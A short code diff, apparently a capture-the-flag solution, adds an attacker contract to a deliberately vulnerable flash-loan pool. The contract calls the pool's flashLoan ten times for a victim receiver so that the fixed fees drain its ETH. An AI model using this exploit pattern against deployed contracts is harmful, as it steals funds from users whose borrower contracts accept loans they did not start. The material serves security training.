@@ -66,3 +66,11 @@ contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
     // Allow deposits of ETH
     receive() external payable {}
 }
+
+contract FlashLoanReceiverAttacker {
+    constructor(NaiveReceiverLenderPool pool, IERC3156FlashBorrower receiver) {
+        for (uint i; i < 10; i++) {
+            pool.flashLoan(receiver, 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE, 0, "");
+        }
+    }
+}
